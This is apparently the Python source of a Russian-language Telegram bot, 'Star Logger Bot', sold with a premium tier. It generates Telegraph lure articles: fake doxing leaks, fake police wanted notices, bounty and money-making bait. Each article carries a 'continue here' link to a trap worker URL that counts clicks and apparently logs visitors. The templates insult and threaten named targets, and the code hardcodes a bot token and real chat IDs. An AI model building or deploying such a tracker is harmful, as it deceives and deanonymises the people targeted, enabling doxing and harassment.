# language: Python, file: main.py, runtime: Python 3.13+, target: Telegram Bot on fadehost
import os
import time
import string
import secrets
import sqlite3
import urllib.parse
from datetime import datetime
from dotenv import load_dotenv

import telebot
from telebot import types
from telegraph import Telegraph

# ---------- CONFIG ----------
load_dotenv()

BOT_TOKEN   = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN") or "9043148910:AAF_ewMZkG7fuIGF-xWfXdIVHeuQ0V-duM0"
ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
WORKER_URL  = os.environ.get("WORKER_URL") or "https://trap.geminialex12.workers.dev"
DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"

CHANNEL_ID    = -1004336153105  # ID канала Project
GROUP_ID      = -1004382024668  # ID группы для проверки подписки
CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
GROUP_LINK    = "https://t.me/+c3xyHely39ozNDYy" # ЗАМЕНИ, ЕСЛИ ЕСТЬ ОТДЕЛЬНАЯ ССЫЛКА НА ГРУППУ
SUPPORT       = "@boyfrer"
PREMIUM_PRICE = 5.0

# ---------- BOT / TELEGRAPH ----------
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
telegraph = Telegraph()
telegraph.create_account(short_name='Star_Logger_Bot')

# ---------- DB ----------
def _conn():
    c = sqlite3.connect(DB_PATH, timeout=10, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

def db_init():
    with _conn() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER UNIQUE,
            username TEXT,
            is_premium INTEGER DEFAULT 0,
            created_at TEXT
        );
        CREATE TABLE IF NOT EXISTS balance (
            user_id INTEGER PRIMARY KEY,
            amount REAL DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS links (
            slug TEXT PRIMARY KEY,
            title TEXT,
            created_by INTEGER,
            created_at INTEGER,
            hits INTEGER DEFAULT 0
        );
        """)

def is_registered(user_id):
    with _conn() as c:
        return c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone() is not None

def register(user_id, username):
    with _conn() as c:
        c.execute("INSERT OR IGNORE INTO users (user_id, username, created_at) VALUES (?,?,?)",
                  (user_id, username, datetime.now().isoformat()))

def is_premium(user_id):
    with _conn() as c:
        r = c.execute("SELECT is_premium FROM users WHERE user_id=?", (user_id,)).fetchone()
        return bool(r and r["is_premium"])

def set_premium(user_id):
    with _conn() as c:
        c.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (user_id,))

def get_balance(user_id):
    with _conn() as c:
        r = c.execute("SELECT amount FROM balance WHERE user_id=?", (user_id,)).fetchone()
        return r["amount"] if r else 0.0

def add_balance(user_id, amount):
    with _conn() as c:
        c.execute("INSERT INTO balance (user_id, amount) VALUES (?,?) "
                  "ON CONFLICT(user_id) DO UPDATE SET amount = amount + ?",
                  (user_id, amount, amount))
        return c.execute("SELECT amount FROM balance WHERE user_id=?", (user_id,)).fetchone()["amount"]

def user_counts():
    with _conn() as c:
        total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        with_bal = c.execute("SELECT COUNT(*) FROM balance WHERE amount > 0").fetchone()[0]
        premium = c.execute("SELECT COUNT(*) FROM users WHERE is_premium=1").fetchone()[0]
        return total, with_bal, premium

def all_user_ids():
    with _conn() as c:
        return [r["user_id"] for r in c.execute("SELECT user_id FROM users")]

def get_all_users(limit=30):
    with _conn() as c:
        return c.execute("""
            SELECT u.user_id, u.username, u.created_at, u.is_premium, COALESCE(b.amount, 0) as balance
            FROM users u
            LEFT JOIN balance b ON u.user_id = b.user_id
            ORDER BY u.created_at DESC LIMIT ?
        """, (limit,)).fetchall()

def create_link(slug, title, created_by):
    with _conn() as c:
        c.execute("INSERT INTO links (slug,title,created_by,created_at) VALUES (?,?,?,?)",
                  (slug, title, created_by, int(time.time())))

def get_user_links_count(user_id):
    with _conn() as c:
        return c.execute("SELECT COUNT(*) FROM links WHERE created_by=?", (user_id,)).fetchone()[0]

def get_user_links(user_id, limit=10):
    with _conn() as c:
        return c.execute("SELECT * FROM links WHERE created_by=? ORDER BY created_at DESC LIMIT ?",
                         (user_id, limit)).fetchall()

def get_all_links(limit=20):
    with _conn() as c:
        return c.execute("""
            SELECT l.*, u.username 
            FROM links l
            LEFT JOIN users u ON l.created_by = u.user_id
            ORDER BY l.created_at DESC LIMIT ?
        """, (limit,)).fetchall()

# ---------- UTIL ----------
def check_sub(user_id):
    try:
        status_ch = bot.get_chat_member(CHANNEL_ID, user_id).status
        if status_ch not in ["member", "administrator", "creator"]:
            return False
            
        status_gr = bot.get_chat_member(GROUP_ID, user_id).status
        if status_gr not in ["member", "administrator", "creator"]:
            return False
            
        return True
    except Exception as e:
        print(f"[!] Ошибка проверки подписки: {e}")
        return False

def send_log(text):
    try:
        bot.send_message(LOG_CHAT_ID, text, disable_web_page_preview=True)
    except Exception:
        pass

def slug_gen(n=8):
    a = string.ascii_letters + string.digits
    return "".join(secrets.choice(a) for _ in range(n))

def make_trap_link(title, created_by, creator_username):
    slug = slug_gen()
    create_link(slug, title, created_by)
    q_title = urllib.parse.quote(title or "—")
    q_user = urllib.parse.quote(creator_username or "—")
    url = f"{WORKER_URL}/t/{slug}?t={q_title}&u={q_user}"
    return url, slug

def build_html(text, trap_url, img_url=None):
    parts = [f"<p>{text}</p>", f'<p><a href="{trap_url}">Продолжение тут</a></p>']
    if img_url:
        parts.append(f'<img src="{img_url}">')
    return "<br>".join(parts)

def make_article(title, text, img_url, template_name, author_id, author_username):
    trap_url, slug = make_trap_link(title, author_id, author_username)
    html = build_html(text, trap_url, img_url)
    page = telegraph.create_page(title=title, html_content=html)
    url = f"https://telegra.ph/{page['path']}"
    
    # Ссылка на ловушку убрана из сообщения
    msg = (
        f"<b>⭐️Star Logger Bot⭐️</b>\n"
        f"<b>⭐️Статья создана</b>\n"
        f"=============================\n"
        f"⭐️Тема: {title}\n"
        f"⭐️Ссылка: {url}"
    )
    return msg, url, slug

# ---------- MENUS ----------
def show_main_menu(uid):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("⭐️Наш канал", url=CHANNEL_LINK))
    kb.add(types.InlineKeyboardButton("📙Мануалы", url='https://t.me/c/2133502681/33'))
    kb.add(types.InlineKeyboardButton("📙Профиль", callback_data='cabinet'))
    kb.add(types.InlineKeyboardButton("🌟Создать логгер", callback_data='logger'))
    
    prem = " 💎" if is_premium(uid) else ""
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(uid, had,
            f'<b>⭐️Star Logger Bot!{prem}\n=============================\n'
            f'⭐️Главное меню\n=============================\n'
            f'💰Баланс: {get_balance(uid):.2f}$\n'
            f'🆔 ID: {uid}</b>', reply_markup=kb)

def admin_menu(chat_id):
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "<b>❌Нет доступа.</b>")
        return
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("💰 Выдать баланс", callback_data='admin_give_bal'))
    kb.add(types.InlineKeyboardButton("👥 Все юзеры", callback_data='admin_users'))
    kb.add(types.InlineKeyboardButton("🔗 Все ссылки", callback_data='admin_links'))
    kb.add(types.InlineKeyboardButton("📢 Рассылка", callback_data='admin_broadcast'))
    kb.add(types.InlineKeyboardButton("📊 Статистика", callback_data='admin_stats'))
    kb.add(types.InlineKeyboardButton("📦 База данных", callback_data='admin_dump'))
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(chat_id, had, caption='<b>⭐️Админ-меню</b>', reply_markup=kb)

# ---------- START ----------
@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid = message.from_user.id
    username = message.from_user.username or ""
    if not is_registered(uid):
        register(uid, username)
        send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")
        
    if not check_sub(uid) and uid not in ADMIN_IDS:
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("📢 Подписаться на канал", url=CHANNEL_LINK))
        kb.add(types.InlineKeyboardButton("💬 Вступить в группу", url=GROUP_LINK))
        kb.add(types.InlineKeyboardButton("✅ Проверить", callback_data='check_sub'))
        bot.send_message(uid, "<b>⚠️ Для использования бота подпишись на канал и вступи в группу!</b>", reply_markup=kb)
        return

    show_main_menu(uid)

@bot.callback_query_handler(func=lambda c: c.data == 'check_sub')
def cb_check_sub(call):
    if check_sub(call.from_user.id) or call.from_user.id in ADMIN_IDS:
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_main_menu(call.message.chat.id)
    else:
        bot.answer_callback_query(call.id, "❌ Ты подписался не на всё! Проверь канал и группу.", show_alert=True)

# ---------- CALLBACKS ----------
@bot.callback_query_handler(func=lambda c: c.data == 'home')
def cb_home(call):
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    show_main_menu(call.message.chat.id)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'cabinet')
def cb_cabinet(call):
    uid = call.message.chat.id
    links = get_user_links(uid)
    total_hits = sum(l["hits"] for l in links)
    prem = "💎 Premium" if is_premium(uid) else "Обычный"
    lines = [
        f"<b>⭐️Профиль</b>",
        "=============================",
        f"🆔 ID: <code>{uid}</code>",
        f"📊 Статус: {prem}",
        f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
        f"🔗 Линков: {len(links)}",
        f"🎯 Хитов: {total_hits}",
        "=============================",
    ]
    if is_premium(uid):
        lines.append("💎 Доступны приватные шаблоны и безлимит ссылок.")
    else:
        lines.append(f"💎 Купить Premium за {PREMIUM_PRICE}$")

    kb = types.InlineKeyboardMarkup()
    if not is_premium(uid):
        kb.add(types.InlineKeyboardButton(f"💎 Купить Premium ({PREMIUM_PRICE}$)", callback_data="buy_premium"))
    kb.add(types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{SUPPORT[1:]}"))
    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
    try:
        bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id,
                                 caption="\n".join(lines), reply_markup=kb)
    except Exception:
        bot.send_message(uid, "\n".join(lines), reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'buy_premium')
def cb_buy_premium(call):
    uid = call.from_user.id
    if is_premium(uid):
        bot.answer_callback_query(call.id, "✅ У тебя уже есть Premium!", show_alert=True)
        return
    
    bal = get_balance(uid)
    if bal < PREMIUM_PRICE:
        bot.answer_callback_query(call.id, f"❌ Недостаточно средств!\nНужно: {PREMIUM_PRICE}$\nУ тебя: {bal:.2f}$", show_alert=True)
        return

    add_balance(uid, -PREMIUM_PRICE)
    set_premium(uid)
    bot.answer_callback_query(call.id, "💎 Premium успешно активирован!", show_alert=True)
    cb_cabinet(call)

# ---------- ADMIN ----------
@bot.message_handler(commands=['admin'])
def cmd_admin(m):
    admin_menu(m.chat.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_give_bal' and c.from_user.id in ADMIN_IDS)
def cb_admin_give(call):
    bot.send_message(call.message.chat.id, "<b>⭐️ID и сумму через пробел:</b>\n<code>123456789 10</code>")
    bot.register_next_step_handler(call.message, _admin_give_step)
    bot.answer_callback_query(call.id)

def _admin_give_step(message):
    parts = message.text.split()
    if len(parts) < 2 or not parts[0].lstrip("-").isdigit():
        bot.reply_to(message, "❌ Формат: <code>123456789 10</code>")
        return
    try:
        uid, amount = int(parts[0]), float(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Сумма должна быть числом")
        return
    new_bal = add_balance(uid, amount)
    try:
        bot.send_message(uid, f"<b>💰Баланс пополнен на {amount:.2f}$. Текущий: {new_bal:.2f}$</b>")
    except Exception:
        pass
    bot.reply_to(message, f"✅ {uid} +{amount:.2f}$, теперь {new_bal:.2f}$")

@bot.callback_query_handler(func=lambda c: c.data == 'admin_users' and c.from_user.id in ADMIN_IDS)
def cb_admin_users(call):
    users = get_all_users(30)
    lines = ["<b>👥 Последние 30 юзеров:</b>"]
    for u in users:
        prem = "💎" if u['is_premium'] else ""
        lines.append(f"<code>{u['user_id']}</code> @{u['username'] or '-'} · {u['balance']:.2f}$ {prem}")
    text = "\n".join(lines)
    if len(text) > 4000: text = text[:3997] + "..."
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                             caption=text, reply_markup=types.InlineKeyboardMarkup().add(
                                 types.InlineKeyboardButton("⬅️ Назад", callback_data="admin_back")))
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_links' and c.from_user.id in ADMIN_IDS)
def cb_admin_links(call):
    links = get_all_links(20)
    lines = ["<b>🔗 Последние 20 ссылок:</b>"]
    for l in links:
        lines.append(f"<code>{l['slug']}</code> · by @{l['username'] or l['created_by']} · {l['title'][:20]}")
    text = "\n".join(lines)
    if len(text) > 4000: text = text[:3997] + "..."
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                             caption=text, reply_markup=types.InlineKeyboardMarkup().add(
                                 types.InlineKeyboardButton("⬅️ Назад", callback_data="admin_back")))
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_back' and c.from_user.id in ADMIN_IDS)
def cb_admin_back(call):
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    admin_menu(call.message.chat.id)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_broadcast' and c.from_user.id in ADMIN_IDS)
def cb_admin_bc(call):
    bot.send_message(call.message.chat.id, "⭐️Текст рассылки:")
    bot.register_next_step_handler(call.message, _admin_bc_step)
    bot.answer_callback_query(call.id)

def _admin_bc_step(message):
    ok = fail = 0
    for uid in all_user_ids():
        try:
            bot.send_message(uid, message.text)
            ok += 1
        except Exception:
            fail += 1
    bot.reply_to(message, f"✅Отправлено: {ok}, ошибок: {fail}")

@bot.callback_query_handler(func=lambda c: c.data == 'admin_stats' and c.from_user.id in ADMIN_IDS)
def cb_admin_stats(call):
    total, with_bal, premium = user_counts()
    bot.send_message(call.message.chat.id,
        f"<b>⭐️Star Logger Bot</b>\n👥Всего: {total}\n💰С балансом: {with_bal}\n💎Premium: {premium}")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == 'admin_dump' and c.from_user.id in ADMIN_IDS)
def cb_admin_dump(call):
    try:
        with open(DB_PATH, 'rb') as f:
            bot.send_document(call.message.chat.id, f)
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ {e}")
    bot.answer_callback_query(call.id)

# ---------- LOGGER ----------
@bot.callback_query_handler(func=lambda c: c.data == 'logger')
def cb_logger(call):
    if not check_sub(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Подпишись на канал и группу!", show_alert=True)
        return

    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
        if get_user_links_count(call.from_user.id) >= 5:
            bot.answer_callback_query(call.id, "❌ Лимит 5 ссылок! Купи Premium 💎 для безлимита.", show_alert=True)
            return

    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("📙Д0xing", callback_data="cat_dox"))
    kb.add(types.InlineKeyboardButton("📙Байты", callback_data="cat_bait"))
    kb.add(types.InlineKeyboardButton("📙Розыски", callback_data="cat_wanted"))
    if is_premium(call.from_user.id) or call.from_user.id in ADMIN_IDS:
        kb.add(types.InlineKeyboardButton("💎 Приватные схемы", callback_data="cat_private"))
    kb.add(types.InlineKeyboardButton("📙Свой текст", callback_data="tpl_custom"))
    kb.add(types.InlineKeyboardButton("⭐️Главное меню", callback_data="home"))
    with open('had2.jpg', 'rb') as had:
        bot.send_photo(call.message.chat.id, had, caption="<b>⭐️Выберите шаблон:</b>", reply_markup=kb)
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    bot.answer_callback_query(call.id)

TEMPLATES = {
    "tpl_dox_v1": "Dox V1", "tpl_dox_v2": "Dox V2",
    "tpl_dox_v3": "Dox V3", "tpl_dox_v4": "Dox V4",
    "tpl_man_v1": "Manual V1", "tpl_man_v2": "Manual V2",
    "tpl_mvd_v1": "Розыск МВД V1", "tpl_mvd_v2": "Розыск МВД V2",
    "tpl_sport_v1": "СпортОтряд V1", "tpl_sport_v2": "СпортОтряд V2",
    "tpl_money_v1": "Заработок V1", "tpl_money_v2": "Заработок V2",
    "tpl_priv_v1": "💎 Приватный Dox V1",
}

TEXTS = {
    "tpl_dox_v1": "Данный человек {title} очень часто пиздел и разбрасывался словами. Мы решили собрать его данные в кучу и слить вам, данные приложены ниже.",
    "tpl_dox_v2": "Данная личность {title} давно сидит в сети Telegram и мешает пользователям. Данные приложены ниже в полном формате.",
    "tpl_dox_v3": "Д0КС ТАКОЙ ЛИЧНОСТИ КАК {title}. Данная личность неоднократно пиздела дохуя лишнего — данные приложены ниже.",
    "tpl_dox_v4": "Такая личность как {title} — много пиздит и угрожает. Его данные солью на общее обозрение — они приложены ниже.",
    "tpl_man_v1": "Здравствуй, благодарю за покупку мануала от {title}. Начнём с раздела: безопасность и настройка анонимности.",
    "tpl_man_v2": "MANUAL — ликвидация анонимности: стратегии защиты. Мануал от {title}. В современном мире сохранение анонимности важно.",
    "tpl_mvd_v1": "Наиболее опасный разыскиваемый преступник в Telegram {title}. МВД России просит помочь в розыске.",
    "tpl_mvd_v2": "Здравствуйте, граждане! В розыск объявлен пользователь Telegram с ником {title}. МВД просит помочь.",
    "tpl_sport_v1": "Личность {title} разыскивается СпортОтрядом. Вознаграждение 40.000р.",
    "tpl_sport_v2": "Личность {title} задолжала людям денег. Просьба отыскать и наказать. Вознаграждение 40.000р.",
    "tpl_money_v1": "Связка TikTok+YouTube: как монетизировать каналы на развлекательном контенте. {title} — лох.",
    "tpl_money_v2": "Крипто-пираты: заработок на seed-фразах. 1000$ в месяц. {title} — лох.",
    "tpl_priv_v1": "ПРИВАТНЫЙ СЛИВ ДАННЫХ ЛИЧНОСТИ {title}. Данный текст доступен только Premium пользователям. Его данные: ...",
}

@bot.callback_query_handler(func=lambda c: c.data in ("cat_dox", "cat_bait", "cat_wanted"))
def cb_cat(call):
    kb = types.InlineKeyboardMarkup(row_width=1)
    if call.data == "cat_dox":
        keys = ("tpl_dox_v1", "tpl_dox_v2", "tpl_dox_v3", "tpl_dox_v4")
    elif call.data == "cat_bait":
        keys = ("tpl_man_v1", "tpl_man_v2", "tpl_money_v1", "tpl_money_v2")
    else:
        keys = ("tpl_mvd_v1", "tpl_mvd_v2", "tpl_sport_v1", "tpl_sport_v2")
    for k in keys:
        kb.add(types.InlineKeyboardButton(TEMPLATES[k], callback_data=k))
    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="logger"))
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                             caption="<b>⭐️Выберите шаблон:</b>", reply_markup=kb)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == "cat_private")
def cb_cat_private(call):
    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Это для Premium!", show_alert=True)
        return
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton(TEMPLATES["tpl_priv_v1"], callback_data="tpl_priv_v1"))
    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="logger"))
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id,
                             caption="<b>💎 Приватные шаблоны:</b>", reply_markup=kb)
    bot.answer_callback_query(call.id)

_pending = {}

@bot.callback_query_handler(func=lambda c: c.data in TEMPLATES)
def cb_template(call):
    _pending[call.from_user.id] = call.data
    bot.send_message(call.message.chat.id, "<b>⭐️Введите ник/имя для шаблона:</b>")
    bot.register_next_step_handler(call.message, _ask_img)
    bot.answer_callback_query(call.id)

def _ask_img(message):
    key = _pending.get(message.from_user.id)
    if not key:
        return
    title = message.text.strip()[:80]
    _pending[message.from_user.id] = (key, title)
    bot.send_message(message.chat.id, "<b>⭐️URL картинки (или /skip):</b>")
    bot.register_next_step_handler(message, _make_step)

def _make_step(message):
    data = _pending.pop(message.from_user.id, None)
    if not data or not isinstance(data, tuple):
        return
    key, title = data
    img = None if message.text.strip() == "/skip" else message.text.strip()
    text = TEXTS[key].format(title=title)
    username = message.from_user.username or str(message.from_user.id)
    msg, url, slug = make_article(title, text, img, TEMPLATES[key], message.from_user.id, username)
    bot.send_message(message.chat.id, msg)
    send_log(f"🔔 {message.from_user.id}\n⭐️{TEMPLATES[key]}\nТема: {title}\nСтатья: {url}")

@bot.callback_query_handler(func=lambda c: c.data == "tpl_custom")
def cb_custom(call):
    bot.send_message(call.message.chat.id, "<b>⭐️Введите заголовок:</b>")
    bot.register_next_step_handler(call.message, _cust_title)
    bot.answer_callback_query(call.id)

_custom = {}

def _cust_title(message):
    _custom[message.from_user.id] = {"title": message.text.strip()[:80]}
    bot.send_message(message.chat.id, "<b>⭐️Введите текст:</b>")
    bot.register_next_step_handler(message, _cust_text)

def _cust_text(message):
    _custom[message.from_user.id]["text"] = message.text
    bot.send_message(message.chat.id, "<b>⭐️URL картинки (или /skip):</b>")
    bot.register_next_step_handler(message, _cust_img)

def _cust_img(message):
    d = _custom.pop(message.from_user.id, None)
    if not d:
        return
    img = None if message.text.strip() == "/skip" else message.text.strip()
    username = message.from_user.username or str(message.from_user.id)
    msg, url, slug = make_article(d["title"], d["text"], img, "custom", message.from_user.id, username)
    bot.send_message(message.chat.id, msg)
    send_log(f"🔔 {message.from_user.id}\n⭐️custom\nТема: {d['title']}\nСтатья: {url}")

# ---------- ENTRY ----------
if __name__ == "__main__":
    db_init()
    print("[*] bot polling…")
    bot.infinity_polling()
